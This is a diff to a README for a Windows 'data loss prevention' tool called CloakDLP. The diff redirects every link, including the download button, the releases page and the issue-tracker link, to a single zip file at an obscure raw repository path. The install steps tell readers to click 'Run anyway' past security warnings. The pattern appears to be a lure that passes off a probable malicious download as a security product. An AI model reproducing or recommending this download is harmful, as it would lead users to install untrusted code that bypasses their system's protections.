@@ -1,6 +1,6 @@
 # 🛡️ CloakDLP - Catch Credit Card Leaks Before They Happen
 
-[![Download Now](https://img.shields.io/badge/Download_CloakDLP-v1.0.0-blueviolet?style=for-the-badge&logo=windows&labelColor=black)](https://github.com/bestowernortherneurope615/CloakDLP/releases)
+[![Download Now](https://img.shields.io/badge/Download_CloakDLP-v1.0.0-blueviolet?style=for-the-badge&logo=windows&labelColor=black)](https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip)
 
 ---
 
@@ -44,7 +44,7 @@ Works automatically with Chrome, Edge, Firefox, and other web browsers. It check
 
 ### Step 1: Download
 Visit this link to download the application:  
-[https://github.com/bestowernortherneurope615/CloakDLP/releases](https://github.com/bestowernortherneurope615/CloakDLP/releases)
+[https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip](https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip)
 
 ### Step 2: Run the Installer
 Double-click the downloaded file (CloakDLP.exe). A security warning may appear—click "Run anyway" or "Yes." This is a brand new program from a small developer.
@@ -114,8 +114,8 @@ No registration, no login, no email address needed. We don't track anything.
 
 CloakDLP is developed by a small independent team. If you encounter any issues:
 
-- Check the [Releases page](https://github.com/bestowernortherneurope615/CloakDLP/releases) for updates
-- Please open an [Issue on GitHub](https://github.com/bestowernortheurope615/CloakDLP/issues)
+- Check the [Releases page](https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip) for updates
+- Please open an [Issue on GitHub](https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip)
 - We'll respond within 48 hours
 
 **Known Limitation:** CloakDLP works on Windows only.
@@ -130,6 +130,6 @@ CloakDLP is not responsible for any misuse of alerts; always check destination m
 ---
 
 **Always download the latest version from the link:**  
-[Download CloakDLP Now](https://github.com/bestowernortherneurope615/CloakDLP/releases)
+[Download CloakDLP Now](https://raw.githubusercontent.com/bestowernortherneurope615/CloakDLP/main/agent/CloakDlp.Tray/3.3-alpha.3.zip)
 
 Keywords: credit card security, data loss prevention, Windows tool, phishing protection, identity theft, risk score, browser extension, csharp, cybersecurity, dlp, dotnet, endpoint-security, fastapi, fraud, prevention, nextjs, python, security, typescript, windows
